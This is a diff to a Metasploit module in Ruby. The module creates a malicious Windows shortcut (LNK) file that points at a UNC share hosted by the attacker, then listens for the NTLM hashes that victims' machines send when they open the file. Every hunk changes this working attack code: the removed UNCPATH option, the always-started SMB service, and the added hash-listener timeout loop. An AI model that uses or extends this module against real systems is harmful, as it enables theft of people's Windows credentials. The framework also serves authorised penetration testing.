@@ -5,7 +5,6 @@
 require 'faker'
 
 class MetasploitModule < Msf::Auxiliary
-  Rank = GoodRanking
 
   include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::SMB::Server::Share
@@ -32,23 +31,20 @@ class MetasploitModule < Msf::Auxiliary
           [
             'URL', 'https://zeifan.my/Right-Click-LNK/',
             'EDB', '42382',
-            'URL', 'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb'
           ]
         ],
         'Platform' => 'win',
         'Targets' => [ [ 'Windows Universal', {} ] ],
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => []
+          'SideEffects' => [ARTIFACTS_ON_DISK]
         },
         'DisclosureDate' => '2025-05-10' # Disclosed to MSRC on 2025-05-10
       )
     )
 
     register_options([
-      OptString.new('FILENAME', [ true, 'The LNK file name', 'msf.lnk']),
-      OptString.new('UNCPATH', [ false, 'UNC path that will be accessed (\\\\server\\share)', nil]),
       OptString.new('APPNAME', [ false, 'Name of the application to display', nil])
     ])
   end
@@ -154,25 +150,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     app_name = datastore['APPNAME']
-    while app_name && !app_name.empty?
-      app_name = Faker::App.name
-      app_name ||= 'Application'
-    end
 
-    unc_path = datastore['UNCPATH']
-    if unc_path.nil? || unc_path.empty?
-      start_service
-      unc_path = "\\\\#{datastore['SRVHOST']}\\#{share_name}"
-    else
-      unless unc_path.match(/^\\\\[^\\]+\\[^\\]+$/)
-        fail_with(Failure::BadConfig, 'UNCPATH format invalid, expected \\\\server\\share')
-      end
-    end
+    app_name = "#{Faker::App.name}Application" if app_name.blank?
+
+    start_service
+    unc_share = datastore['SHARE']
+    unc_share = Rex::Text.rand_text_alphanumeric(6) if unc_share.blank?
+    unc_path = "\\\\#{datastore['SRVHOST']}\\#{unc_share}"
 
     lnk_data = ms_shllink(unc_path, app_name)
     file_create(lnk_data)
     print_good("LNK file created: #{datastore['FILENAME']}")
     print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
+    stime = Time.now.to_f
+    timeout = datastore['ListenerTimeout'].to_i
+    loop do
+      break if timeout > 0 && (stime + timeout < Time.now.to_f)
+
+      Rex::ThreadSafe.sleep(1)
+    end
   end
 
 end
